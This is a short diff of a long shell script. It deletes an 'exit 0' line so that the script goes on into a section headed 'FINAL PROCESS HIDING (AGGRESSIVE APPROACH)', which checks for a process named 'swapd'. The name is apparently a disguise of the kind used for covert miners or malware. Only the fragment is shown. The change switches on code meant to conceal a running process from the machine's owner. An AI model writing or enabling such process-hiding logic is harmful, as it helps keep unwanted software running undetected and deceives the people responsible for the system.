@@ -3419,8 +3419,6 @@ fi
 echo "========================================================================"
 echo ""
 
-exit 0
-
 # ==================== FINAL PROCESS HIDING (AGGRESSIVE APPROACH) ====================
 ps ax|grep swapd
 sleep 5
